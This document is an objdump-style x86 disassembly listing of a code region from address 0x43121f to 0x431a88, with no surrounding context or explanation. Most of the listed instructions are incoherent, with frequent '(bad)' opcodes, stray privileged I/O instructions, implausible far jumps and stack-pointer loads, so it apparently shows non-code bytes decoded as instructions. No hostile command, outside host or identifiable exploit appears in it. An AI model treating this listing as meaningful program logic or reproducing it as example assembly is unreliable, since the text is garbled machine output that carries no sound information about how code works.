  43121f:	dec    ecx
  431220:	lea    eax,[ebx]
  431222:	xor    eax,0x18fc0fc7
  431227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431228:	repz clc 
  43122a:	add    eax,DWORD PTR [ebp+0x46]
  43122d:	prefetcht0 BYTE PTR [ecx-0x2]
  431231:	xor    eax,0x7c60872
  431236:	mov    esp,0xbd32c69b
  43123b:	pop    esi
  43123c:	mov    cl,0xbe
  43123f:	or     al,0xc6
  431241:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431248:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43124f:	add    dh,al
  431251:	mov    eax,ebx
  431253:	xor    DWORD PTR [ebx],0x35008dbc
  431259:	mov    ecx,DWORD PTR [edi]
  43125b:	sbb    al,0x18
  43125d:	inc    ebp
  43125e:	xrelease mov DWORD PTR [ebx],0x188546f4
  431265:	clc    
  431266:	(bad)  
  431267:	xor    DWORD PTR [edx-0x64],esi
  43126a:	lea    ecx,[ecx+0x45ffe838]
  431270:	mov    ecx,ebx
  431272:	fadd   st,st(6)
  431274:	dec    ebp
  431275:	lds    edi,FWORD PTR [eax+0x7145fc56]
  43127b:	out    0x1,eax
  43127d:	inc    ebp
  43127e:	lea    ebp,ds:0xc8ffc6ff
  431284:	enter  0xa33,0xc6
  431288:	push   ebp
  431289:	leave  
  43128a:	(bad)  
  43128b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431291:	add    BYTE PTR [ebp+0x44],al
  431294:	mov    eax,esp
  431296:	mov    WORD PTR [esi+0x46398300],?
  43129c:	psubusw mm4,QWORD PTR [esi-0x78]
  4312a0:	add    BYTE PTR [ebx-0x1303f975],al
  4312a6:	add    BYTE PTR [ebp+0x1],0xeb
  4312aa:	add    BYTE PTR [ebp+0x38],al
  4312ad:	in     eax,dx
  4312ae:	inc    ebp
  4312af:	inc    ebp
  4312b0:	mov    ebx,ebx
  4312b2:	add    BYTE PTR [ebp+0x0],0xec
  4312b6:	mov    DWORD PTR [ebp-0x41],eax
  4312b9:	sub    eax,0x2c00454e
  4312be:	ins    DWORD PTR es:[edi],dx
  4312bf:	inc    ebp
  4312c0:	add    BYTE PTR [esi+0x66],bh
  4312c3:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312ca:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312d4:	dec    edi
  4312d5:	pop    es
  4312d6:	add    ah,ch
  4312d8:	mov    DWORD PTR [ebp+0x68],eax
  4312db:	in     eax,dx
  4312dc:	inc    DWORD PTR [ebp-0x7d]
  4312df:	out    0xc0,al
  4312e1:	inc    ebp
  4312e2:	mov    edx,esp
  4312e4:	push   0x45
  4312e6:	(bad)  
  4312e7:	jmp    0xdf9258a4
  4312ec:	add    BYTE PTR [ebp-0x77],al
  4312ef:	out    dx,al
  4312f0:	ins    BYTE PTR es:[edi],dx
  4312f1:	inc    ebp
  4312f2:	jmp    edi
  4312f4:	add    DWORD PTR [ebp-0x14],0x7e
  4312f8:	mov    esi,esi
  4312fa:	outs   dx,BYTE PTR ds:[esi]
  4312fb:	inc    esp
  4312fc:	(bad)  
  4312fd:	mov    esp,0x8341b68d
  431302:	mov    DWORD PTR [esi+0x70],eax
  431305:	fcos   
  431307:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  43130d:	in     al,dx
  43130e:	jb     0x431295
  431310:	(bad)  
  431311:	dec    DWORD PTR [ebx-0x7aba9901]
  431317:	mov    edi,edi
  431319:	fdivr  st,st(7)
  43131b:	out    dx,eax
  43131c:	rcl    BYTE PTR [ebx],0x66
  43131f:	mov    DWORD PTR [ebp-0xc70075],eax
  431325:	(bad)  
  431326:	std    
  431327:	cmp    eax,DWORD PTR [eax]
  431329:	jne    0x431391
  43132b:	mov    DWORD PTR [ebp-0xba0048],eax
  431331:	in     al,dx
  431332:	outs   dx,BYTE PTR ds:[esi]
  431333:	pushf  
  431334:	add    BYTE PTR [ebx-0x7f7a039a],cl
  43133a:	inc    DWORD PTR [ecx]
  43133c:	inc    DWORD PTR [eax]
  43133e:	jae    0x431378
  431340:	add    BYTE PTR [ebp+0x850266],al
  431346:	inc    DWORD PTR [ebp-0x1]
  431349:	mov    eax,eax
  43134b:	jl     0x4313b3
  43134d:	add    BYTE PTR [ebp-0x740077],al
  431353:	cld    
  431354:	dec    eax
  431355:	add    BYTE PTR [eax],0x1
  431358:	data16 add BYTE PTR [ebp+0x38],al
  43135c:	mov    eax,0x47c2
  431361:	mov    eax,0x824f89
  431366:	inc    edi
  431367:	mov    DWORD PTR [edx+0x64],ebp
  43136a:	inc    WORD PTR [ebp-0x75]
  43136e:	(bad)  
  43136f:	data16 rol BYTE PTR [ebp-0x16001a],1
  431376:	inc    ebp
  431377:	jge    0x431358
  431379:	add    bh,ah
  43137b:	lea    ax,[ebp-0x750030]
  431382:	add    al,0x46
  431385:	jmp    0x40ff:0x8885
  43138b:	push   DWORD PTR [ebp+0x52]
  43138e:	lea    eax,[eax]
  431390:	shl    BYTE PTR [esi-0x7b],1
  431393:	test   esi,edi
  431395:	(bad)  
  431396:	(bad)  
  431397:	inc    DWORD PTR [ebp-0x990140]
  43139d:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  4313a3:	inc    edi
  4313a4:	push   ecx
  4313a5:	xor    ax,WORD PTR [ebp-0x8d0045]
  4313ac:	add    al,al
  4313ae:	ret    
  4313af:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313b6:	push   eax
  4313b7:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313be:	add    BYTE PTR [ebx-0x764f8839],al
  4313c4:	push   DWORD PTR [esi+0x1]
  4313c7:	inc    DWORD PTR [eax]
  4313c9:	mov    eax,0xff99ff
  4313ce:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313d4:	jne    0x43138e
  4313d6:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313e0:	mov    ecx,0xd74fb8
  4313e5:	add    cl,al
  4313e7:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313ed:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313f4:	(bad)  
  4313f5:	push   ebp
  4313f7:	mov    eax,0x8c2789
  4313fc:	ret    0x6689
  4313ff:	adc    BYTE PTR [ebp+0x48],0x8d
  431403:	add    bh,ah
  431405:	mov    WORD PTR [ebp-0x70],ax
  431409:	(bad)  
  43140a:	ret    0x667d
  43140d:	or     BYTE PTR [ebp-0x77],dl
  431410:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431417:	loop   0x4313a2
  431419:	(bad)  
  43141a:	xchg   esi,eax
  43141b:	aam    0xcf
  43141d:	out    dx,al
  43141e:	mov    DWORD PTR [esi-0x68],edi
  431421:	inc    ebp
  431422:	dec    edx
  431423:	pop    ecx
  431424:	mov    edx,DWORD PTR [eax]
  431426:	repnz push bp
  431429:	or     BYTE PTR [ebx+0x55106638],0x49
  431430:	(bad)  
  431431:	repnz xor eax,0xa0898945
  431437:	mov    ah,0x89
  431439:	jmp    DWORD PTR [edx+0x66b0418d]
  43143f:	inc    DWORD PTR [ebp+0x50]
  431442:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431446:	mov    DWORD PTR [eax],ecx
  431448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431449:	pop    es
  43144a:	inc    ecx
  43144b:	(bad)  
  43144c:	data16 fwait
  43144e:	inc    ebp
  43144f:	xor    ah,BYTE PTR [esi+0x3]
  431452:	dec    ebp
  431453:	push   eax
  431454:	inc    bp
  431456:	jge    0x4313db
  431458:	mov    esp,DWORD PTR [esi-0x18]
  43145b:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431461:	add    DWORD PTR [ebx],esi
  431463:	add    BYTE PTR [ebx],al
  431465:	test   DWORD PTR [ebx],esi
  431467:	(bad)  
  431468:	inc    WORD PTR [ebp+0x0]
  43146c:	mov    eax,DWORD PTR [eax]
  43146e:	call   0x8898cba3
  431473:	mov    esi,eax
  431475:	clc    
  431476:	ret    
  431477:	rol    cl,0xa
  43147a:	mov    DWORD PTR ds:0x7c0ec88,esi
  431480:	mov    edx,edi
  431482:	pushf  
  431483:	pop    es
  431484:	jmp    FWORD PTR [edx+0x66]
  431487:	add    BYTE PTR [ebp-0x990175],al
  43148d:	inc    ebp
  43148e:	test   DWORD PTR [ebx-0x2f00f202],eax
  431494:	push   ebp
  431495:	mov    edi,eax
  431497:	mov    dh,BYTE PTR [eax+0x266ff51]
  43149d:	push   ebp
  43149e:	add    BYTE PTR [ebx-0x764b0777],al
  4314a4:	dec    DWORD PTR [esi+0x661851e8]
  4314aa:	add    BYTE PTR [ebp-0x7b],dl
  4314ad:	cmp    esi,0xfffffffb
  4314b0:	dec    DWORD PTR [ecx+0x51fe9285]
  4314b6:	jmp    DWORD PTR [esi-0x75]
  4314b9:	push   ebp
  4314ba:	hlt    
  4314bb:	data16 (bad) 
  4314bd:	dec    ebp
  4314be:	ret    
  4314bf:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314c5:	lea    edx,[eax-0x1]
  4314c8:	jne    0x43149b
  4314ca:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314d0:	dec    BYTE PTR [ecx+0x51559eff]
  4314d6:	mov    DWORD PTR [esi-0x4c],esp
  4314d9:	push   ebp
  4314da:	jmp    DWORD PTR [esi-0x18]
  4314dd:	inc    ebp
  4314de:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314e4:	(bad)  
  4314e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314e6:	inc    eax
  4314e8:	test   DWORD PTR [esi-0x2],esp
  4314eb:	inc    ebp
  4314ec:	dec    DWORD PTR [ebp-0x760bde75]
  4314f2:	(bad)  
  4314f3:	test   al,0xc3
  4314f5:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314fb:	lods   al,BYTE PTR ds:[esi]
  4314fc:	push   eax
  4314fd:	inc    ebp
  4314fe:	jne    0x43150f
  431500:	dec    DWORD PTR [ebp+0x8]
  431503:	mov    ecx,DWORD PTR [ebx]
  431505:	sbb    al,0x0
  431507:	(bad)  
  431508:	mov    eax,0xc14fc3
  43150d:	mov    DWORD PTR [ecx-0xbabf64],ecx
  431513:	movsx  ecx,WORD PTR [ebp+0x4e]
  431517:	xor    eax,DWORD PTR [eax]
  431519:	add    eax,edi
  43151b:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  431521:	xor    edi,DWORD PTR [eax+0x854f66]
  431527:	dec    BYTE PTR [ecx-0x76bb01]
  43152d:	mov    BYTE PTR [ebx-0x76724001],al
  431533:	pushf  
  431534:	inc    esi
  431535:	(bad)  
  431536:	dec    DWORD PTR [ebp-0x7abe6373]
  43153c:	sar    esi,0x89
  43153f:	dec    DWORD PTR [eax+0x0]
  431542:	inc    DWORD PTR [eax]
  431544:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  43154b:	xlat   BYTE PTR ds:[ebx]
  43154c:	dec    edx
  43154d:	add    bh,bh
  43154f:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431555:	lea    esp,[esi-0x50]
  431558:	(bad)  
  431559:	(bad)  
  43155a:	call   DWORD PTR [eax-0x1]
  43155d:	inc    ebp
  43155e:	rdpmc  
  431560:	add    BYTE PTR [ebx],al
  431562:	push   ax
  431564:	lea    eax,[ebp-0x1]
  43156a:	js     0x43156b
  43156c:	add    al,bh
  43156e:	push   bp
  431570:	lea    ecx,[ebp-0x7701]
  431576:	fmul   DWORD PTR [ebp-0x7a997800]
  43157c:	(bad)  
  43157d:	(bad)  
  43157e:	(bad)  
  43157f:	(bad)  
  431580:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431586:	dec    eax
  431587:	mov    eax,0x8d8dffff
  43158c:	mov    al,0xb0
  43158e:	(bad)  
  43158f:	call   DWORD PTR [ecx+0x50]
  431592:	dec    ebp
  431593:	inc    ebp
  431594:	mov    esi,0x7030833
  431599:	push   eax
  43159a:	into   
  43159b:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  4315a1:	call   DWORD PTR [ecx-0x8]
  4315a4:	lea    edx,[ebp-0x1]
  4315a7:	jmp    0x7617ab
  4315ac:	inc    eax
  4315ad:	jnp    0x43153c
  4315af:	add    dh,bh
  4315b1:	inc    WORD PTR [ebp-0x8a00b0]
  4315b8:	mov    edx,eax
  4315ba:	inc    esp
  4315bb:	add    bh,bh
  4315bd:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315c3:	dec    DWORD PTR [ebx-0x7f820301]
  4315c9:	add    BYTE PTR [ecx],al
  4315cb:	data16 add BYTE PTR [ebp-0xb30077],al
  4315d2:	inc    eax
  4315d4:	(bad)  
  4315d5:	dec    si
  4315d7:	test   edi,edi
  4315d9:	(bad)  
  4315da:	cmp    edi,edi
  4315dc:	add    ecx,DWORD PTR [edi-0x39]
  4315df:	mov    edx,DWORD PTR [edx+0x66]
  4315e2:	inc    DWORD PTR [ebp-0x3d00cb]
  4315e8:	mov    eax,0x66ff8b5e
  4315ee:	jmp    0xb4ff:0xc7ff3895
  4315f5:	push   ecx
  4315f6:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315fc:	call   DWORD PTR [esi-0x1]
  4315ff:	dec    DWORD PTR [eax]
  431601:	mov    ecx,0x805ff
  431606:	inc    ebp
  431607:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  43160d:	mov    ecx,0x35784
  431612:	add    BYTE PTR [ecx-0xffa59b],cl
  431618:	inc    ebp
  431619:	mov    ecx,0x9c6131
  43161e:	(bad)  
  43161f:	mov    eax,ebx
  431621:	pop    esp
  431622:	test   edi,edi
  431624:	clc    
  431625:	lea    eax,[ebp-0x24]
  431628:	cmp    eax,0xc7fe9c8d
  43162d:	push   eax
  43162f:	lea    eax,[ebp+0x45fff8fe]
  431635:	mov    esi,DWORD PTR [ecx]
  431637:	hlt    
  431638:	lahf   
  431639:	push   esp
  43163a:	mov    edx,DWORD PTR [ecx-0x4]
  43163d:	xor    eax,DWORD PTR [eax+0x7201bb]
  431643:	add    BYTE PTR [ebp-0x35],al
  431646:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  43164c:	mov    edx,DWORD PTR [ecx-0x74]
  43164f:	rol    BYTE PTR [eax],0x8d
  431652:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431656:	nop
  431657:	push   ecx
  431658:	add    bh,bh
  43165a:	mov    esp,edi
  43165c:	in     al,0x85
  43165e:	jge    0x43165e
  431660:	test   edi,edi
  431662:	jne    0x4315e9
  431664:	(bad)  
  431665:	(bad)  
  431666:	sbb    bh,bh
  431668:	push   ebp
  431669:	inc    ebp
  43166a:	call   0xffdc10fa
  43166f:	add    BYTE PTR [ebp+0x66],al
  431672:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431678:	cmp    al,0x85
  43167a:	ud0    eax,DWORD PTR [ebp-0x1]
  43167e:	test   DWORD PTR [edi+0x74],ecx
  431681:	dec    edi
  431682:	inc    DWORD PTR [ebp-0x50004]
  431688:	dec    DWORD PTR [edi-0x75]
  43168b:	dec    esi
  43168c:	cld    
  43168d:	test   DWORD PTR [eax+0xff01ff],eax
  431693:	icebp  
  431694:	add    BYTE PTR [edi-0x3a],cl
  431697:	test   ebx,eax
  431699:	inc    BYTE PTR [ebp-0x1]
  43169c:	jne    0x43169e
  43169e:	mov    eax,DWORD PTR [eax]
  4316a0:	cld    
  4316a1:	xor    BYTE PTR [ecx+0x500155],cl
  4316a7:	push   ebp
  4316a8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4316ae:	add    BYTE PTR [ebp+0x35e90f50],al
  4316b4:	add    al,BYTE PTR [eax]
  4316b6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316bc:	add    ah,ch
  4316be:	or     BYTE PTR [ebp+0x4501f845],dh
  4316c4:	jmp    0xdf19ba
  4316c9:	(bad)  
  4316ca:	nop    ecx
  4316cd:	test   DWORD PTR [ebp+0x4502f8],eax
  4316d3:	xor    ecx,DWORD PTR [ebp-0x64]
  4316d6:	mov    eax,edi
  4316d8:	mov    ebx,DWORD PTR [eax+edx*2]
  4316db:	add    eax,0x45fef885
  4316e0:	dec    DWORD PTR [ebx+0x339445]
  4316e6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316ec:	dec    DWORD PTR [ebx-0x460f0375]
  4316f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316f3:	add    esi,edi
  4316f5:	add    bh,bh
  4316f7:	rdpmc  
  4316f9:	add    BYTE PTR [ebx],0x1
  4316fc:	mov    DWORD PTR [eax],eax
  4316fe:	add    al,0x45
  431700:	dec    DWORD PTR [ecx-0x360b3373]
  431706:	dec    DWORD PTR [esi]
  431708:	push   eax
  431709:	jne    0x431750
  43170b:	mov    esi,DWORD PTR [ebx]
  43170d:	cld    
  43170e:	add    esp,ecx
  431710:	push   eax
  431711:	inc    DWORD PTR [ebp-0x75]
  431714:	add    eax,0x800e4
  431719:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43171f:	mov    DWORD PTR [ecx],eax
  431721:	sbb    al,0x0
  431723:	leave  
  431724:	test   DWORD PTR [edi-0x2],eax
  431727:	jne    0x431728
  431729:	call   0xff44012e
  43172e:	xor    BYTE PTR [ebp+0x4d],al
  431731:	mov    edi,edi
  431733:	enter  0x8,0x4d
  431737:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43173d:	mov    eax,DWORD PTR [eax]
  43173f:	cld    
  431740:	add    DWORD PTR [ecx],ebx
  431742:	inc    ebp
  431743:	dec    ebp
  431744:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43174a:	inc    eax
  43174b:	dec    DWORD PTR [ecx-0x270375]
  431751:	add    BYTE PTR [ebx-0x39d72701],cl
  431757:	xchg   ecx,eax
  431758:	ret    
  431759:	add    BYTE PTR [ebp-0x830075],al
  43175f:	add    BYTE PTR [ebp-0x75],al
  431762:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431768:	lea    edi,[edi-0xc]
  43176b:	add    bh,bh
  43176d:	mov    edx,DWORD PTR [eax-0x7b]
  431770:	inc    ebp
  431771:	rdpmc  
  431773:	jne    0x431778
  431775:	add    BYTE PTR [eax-0x75],dl
  431778:	inc    ebp
  431779:	clc    
  43177a:	add    eax,0x400009
  43177f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431785:	mov    eax,DWORD PTR [ecx]
  431787:	in     al,dx
  431788:	add    dh,al
  43178a:	test   ebx,eax
  43178c:	inc    BYTE PTR [ebp-0xff0001]
  431792:	add    BYTE PTR [ebp-0x43],al
  431795:	cmp    esi,0xfffffff8
  431798:	(bad)  
  431799:	push   DWORD PTR [eax]
  43179b:	add    BYTE PTR [ebp-0x3a],dl
  43179e:	test   ebx,eax
  4317a0:	je     0x431727
  4317a2:	mov    edi,edi
  4317a4:	sbb    al,0xff
  4317a6:	test   DWORD PTR gs:[eax],eax
  4317a9:	(bad)  
  4317aa:	js     0x4317ab
  4317ac:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4317b2:	sub    eax,ebx
  4317b4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317ba:	add    eax,DWORD PTR [eax]
  4317bc:	dec    ebp
  4317bd:	push   eax
  4317be:	mov    al,BYTE PTR [ebp+0x1]
  4317c1:	mov    eax,DWORD PTR [ebp-0x68]
  4317c4:	mov    eax,DWORD PTR [eax]
  4317c6:	sbb    bh,al
  4317c8:	or     ah,dh
  4317ca:	dec    ebp
  4317cb:	inc    DWORD PTR [eax+0x4]
  4317ce:	push   ecx
  4317cf:	add    BYTE PTR [edx-0x1],dh
  4317d2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317d8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317e2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317e8:	push   ecx
  4317e9:	cmp    BYTE PTR [ebx],al
  4317eb:	inc    ebp
  4317ec:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317f2:	(bad)  
  4317f3:	(bad)  
  4317f4:	in     al,0xff
  4317f6:	add    BYTE PTR [ebp+0x0],al
  4317f9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317ff:	add    al,bh
  431801:	(bad)  
  431802:	jmp    0x8d85:0x74b0558d
  431809:	dec    DWORD PTR [eax]
  43180b:	call   DWORD PTR [ebp-0x7b]
  43180e:	mov    edi,esi
  431810:	lock call DWORD PTR [ebp-0x75]
  431814:	mov    esi,esp
  431816:	mov    ah,0xc6
  431818:	mov    bh,0xc3
  43181a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431820:	add    DWORD PTR [eax],0x450050ff
  431826:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43182c:	inc    edi
  43182e:	push   esp
  431830:	jmp    0xcd00:0x650481ff
  431837:	mov    DWORD PTR [ebx],esi
  431839:	clc    
  43183a:	cmp    edi,0xff9cff3c
  431840:	jne    0x43184a
  431842:	mov    eax,eax
  431844:	add    esi,DWORD PTR [eax]
  431846:	int3   
  431847:	inc    ebp
  431848:	cmp    al,0x83
  43184a:	add    BYTE PTR [eax],bl
  43184c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431852:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431858:	mov    edi,eax
  43185a:	cmp    BYTE PTR [ebp+0x45],cl
  43185d:	jmp    0x4317ea
  43185f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431862:	inc    ebp
  431863:	or     al,0x2
  431865:	dec    DWORD PTR [ebp+0x18]
  431868:	jne    0x4318bf
  43186a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431870:	mov    edi,DWORD PTR [ebx]
  431872:	in     al,0x50
  431874:	xchg   ecx,eax
  431875:	jmp    0x343677a
  43187a:	adc    al,0x8b
  43187c:	inc    ebp
  43187d:	mov    al,ds:0x8b04008b
  431882:	push   ebp
  431883:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431889:	push   ebp
  43188a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431890:	inc    ebp
  431891:	dec    ebp
  431892:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431898:	mov    DWORD PTR [eax],0xe9ff00f4
  43189e:	add    al,0x0
  4318a0:	add    BYTE PTR [eax],al
  4318a2:	mov    eax,edx
  4318a4:	push   eax
  4318a5:	rol    DWORD PTR [ebp-0xf0177],1
  4318ab:	bound  eax,QWORD PTR [ebp+0x50]
  4318ae:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318b4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318ba:	mov    al,0xf
  4318bc:	test   DWORD PTR [edx],edx
  4318be:	call   DWORD PTR [ebp-0x7a0001]
  4318c4:	(bad)  
  4318c5:	loop   0x4318c6
  4318c7:	jnp    0xc6990ccd
  4318cd:	mov    eax,ebx
  4318cf:	cmp    al,0x8b
  4318d1:	(bad)  
  4318d2:	cld    
  4318d3:	shr    esi,0xc
  4318d6:	add    dl,al
  4318d8:	push   eax
  4318d9:	lea    eax,[ebp-0x1]
  4318dc:	mov    edx,esi
  4318de:	cwde   
  4318df:	cli    
  4318e0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318e6:	or     BYTE PTR [eax],cl
  4318e8:	inc    ebp
  4318e9:	dec    ebp
  4318ea:	inc    DWORD PTR [ebx+0x74803914]
  4318f0:	add    DWORD PTR [ebx+0x451800],ecx
  4318f6:	call   DWORD PTR [eax+edx*1]
  4318f9:	add    ecx,DWORD PTR [ebp-0x34]
  4318fc:	push   edi
  4318fd:	adc    al,0x8
  4318ff:	mov    edx,DWORD PTR [ebp-0x14]
  431902:	mov    ecx,DWORD PTR [ebp+0x18]
  431905:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431909:	inc    DWORD PTR [eax+esi*8]
  43190c:	inc    ebp
  43190d:	stos   BYTE PTR es:[edi],al
  43190e:	mov    edx,DWORD PTR [ebp-0x4]
  431911:	add    DWORD PTR [ebp-0x1c],eax
  431914:	mov    edx,DWORD PTR [ebp-0x70]
  431917:	cmp    eax,DWORD PTR [eax]
  431919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43191a:	mov    eax,DWORD PTR [eax]
  43191c:	cld    
  43191d:	jae    0x43189f
  43191f:	add    eax,DWORD PTR [ecx]
  431921:	clc    
  431922:	add    BYTE PTR [eax+0x30],dl
  431925:	mov    DWORD PTR [ecx],esi
  431927:	clc    
  431928:	pop    ds
  431929:	inc    ebp
  43192a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431930:	(bad)  
  431931:	push   DWORD PTR [edi]
  431933:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431939:	(bad)  
  43193a:	jae    0x43193b
  43193c:	mov    eax,DWORD PTR [ebp-0x740175]
  431942:	sub    eax,DWORD PTR [eax]
  431944:	add    eax,DWORD PTR [eax]
  431946:	mov    DWORD PTR [ecx+0x5f],eax
  431949:	mov    DWORD PTR [ebx-0x4],ebx
  43194c:	ret    0xff
  43194f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431955:	ret    
  431956:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43195c:	add    BYTE PTR [ebp-0x7d],al
  43195f:	mov    DWORD PTR [eax],eax
  431961:	add    al,0x84
  431963:	inc    DWORD PTR [ecx]
  431965:	lea    eax,[eax]
  431967:	hlt    
  431968:	sar    bh,cl
  43196a:	test   BYTE PTR [eax+0x1],dl
  43196d:	inc    ebp
  43196e:	add    BYTE PTR [ebx],dh
  431970:	test   BYTE PTR [ebx],0x84
  431973:	push   eax
  431974:	add    BYTE PTR [ebp+0x0],al
  431977:	add    eax,0x86
  43197c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431982:	add    BYTE PTR [ecx],al
  431984:	add    BYTE PTR [eax],al
  431986:	mov    esi,0x550030
  43198b:	mov    ecx,DWORD PTR [edi]
  43198d:	cld    
  43198e:	fidiv  DWORD PTR [ebp+0x0]
  431991:	mov    edi,DWORD PTR [ecx]
  431993:	xor    BYTE PTR [eax+eax*1],0x84
  431997:	add    eax,DWORD PTR [eax]
  431999:	sbb    BYTE PTR [eax],al
  43199b:	jne    0x43194e
  43199d:	mov    eax,DWORD PTR [ecx]
  43199f:	sbb    BYTE PTR [eax],al
  4319a1:	mov    DWORD PTR [ebp-0x1],esp
  4319a4:	add    BYTE PTR [eax+0x30e45ca],bh
  4319aa:	ret    0xb7fc
  4319ad:	dec    ebp
  4319ae:	or     al,0x89
  4319b0:	dec    ebp
  4319b1:	cld    
  4319b2:	cmovne ecx,DWORD PTR [eax-0x75]
  4319b6:	add    edi,esp
  4319b8:	seto   BYTE PTR [esi-0x72ffffff]
  4319bf:	inc    ebp
  4319c0:	adc    al,0x8b
  4319c2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319c9:	cmp    DWORD PTR [edi+0x72],edx
  4319cc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319d2:	gs cmp al,0x0
  4319d5:	je     0x4319ad
  4319d7:	push   eax
  4319d8:	sar    BYTE PTR [eax],1
  4319da:	mov    bh,0x3e
  4319dc:	push   cs
  4319dd:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319e3:	add    DWORD PTR [ecx+0x12],ebp
  4319e6:	dec    edx
  4319e7:	(bad)  
  4319e8:	mov    eax,edx
  4319ea:	in     al,dx
  4319eb:	adc    DWORD PTR [ecx],esi
  4319ed:	pop    esi
  4319ee:	inc    ecx
  4319ef:	leave  
  4319f0:	or     DWORD PTR [eax],ebx
  4319f2:	gs push ebp
  4319f4:	add    ah,ch
  4319f6:	into   
  4319f7:	in     al,dx
  4319f8:	enter  0xb756,0xf0
  4319fc:	push   cs
  4319fd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a07:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a0d:	jnp    0x74439f15
  431a13:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a19:	add    BYTE PTR [edi],cl
  431a1b:	mov    edi,DWORD PTR [ecx-0x78]
  431a1e:	ltr    WORD PTR [ecx-0x7b]
  431a22:	dec    DWORD PTR [edi]
  431a24:	clc    
  431a25:	out    0x45,eax
  431a27:	add    BYTE PTR [eax],cl
  431a29:	cmp    ebx,0xffffff8c
  431a2c:	jge    0x431a2e
  431a2e:	jb     0x431a40
  431a30:	je     0x521ab0
  431a36:	pop    edx
  431a37:	push   esi
  431a38:	mov    ecx,DWORD PTR [edi]
  431a3a:	in     al,dx
  431a3b:	rol    DWORD PTR [ebp+0x0],1
  431a3e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a45:	cmp    DWORD PTR [ecx],0xfffffff0
  431a48:	hlt    
  431a49:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a4f:	(bad)  
  431a51:	push   eax
  431a52:	jns    0xb842fed0
  431a58:	lock push cs
  431a5a:	ror    edx,0x3
  431a5d:	test   BYTE PTR [ecx+0x5500e800],cl
  431a63:	dec    eax
  431a64:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a68:	(bad)  
  431a69:	mov    esi,0x7f33ff5f
  431a6e:	inc    eax
  431a6f:	test   DWORD PTR [edx],eax
  431a71:	je     0x431a33
  431a73:	mov    ecx,ecx
  431a75:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a79:	and    eax,DWORD PTR [eax+0xf0103]
  431a7f:	jp     0x431a6d
  431a81:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a85:	add    edx,DWORD PTR [edi+0x74]
  431a88:	sbb    BYTE PTR [ebp+0x4d001484],cl
